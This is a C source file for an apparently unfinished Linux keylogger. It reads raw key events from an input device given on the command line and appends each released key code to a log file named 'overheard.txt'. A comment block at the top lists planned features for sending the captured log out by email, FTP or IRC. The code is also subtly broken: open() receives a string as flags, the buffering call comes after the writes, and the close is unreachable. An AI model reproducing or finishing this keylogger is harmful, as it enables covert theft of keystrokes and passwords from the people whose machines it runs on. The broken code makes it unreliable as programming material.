/*
* ADD TIMESTAMP
* ADD ERROR IF USER IS NOT ROOT
* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices)
* ONCE FILE REACHES A CERTAIN SIZE-->EMAIL
* IF STATEMENT--->SEND LOG FILE VIA EMAIL
* ELSE ERROR--->UPLOAD VIA FTP
* GRAB FROM IRC????
*/
#include <linux/input.h>	// input_event
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <unistd.h>  		// read
#include <string.h>

int main(int argc, char **argv) {
	FILE *listening;
	int key;
	char buff[1024];  /* sets buffer size */

	if(argc < 2) {
		printf("USAGE: %s <device>\n", argv[0]);
		return 1;
	}

	listening = fopen("overheard.txt", "a+");  /* opens/creates the log */
	if (listening == NULL) {
		fprintf(stderr, "ERROR: Log file not found\n");
		return 1;
	}

	key = open(argv[1], "r");  /* opens the port */
	// we'll use input_event to identify what we're reading
	struct input_event ev;

	while(1) {
		// passes keyboard input into input_event
		read(key, &ev, sizeof(struct input_event));
		// Only read the key release event
		if(ev.value == 0 && ev.type == 1) {	
			fprintf(listening, "%i", ev.code);
			// forces the write to listening
			setvbuf(listening, buff, _IOFBF, 1024);
		}
	}
	fclose(listening);

	return 0;
}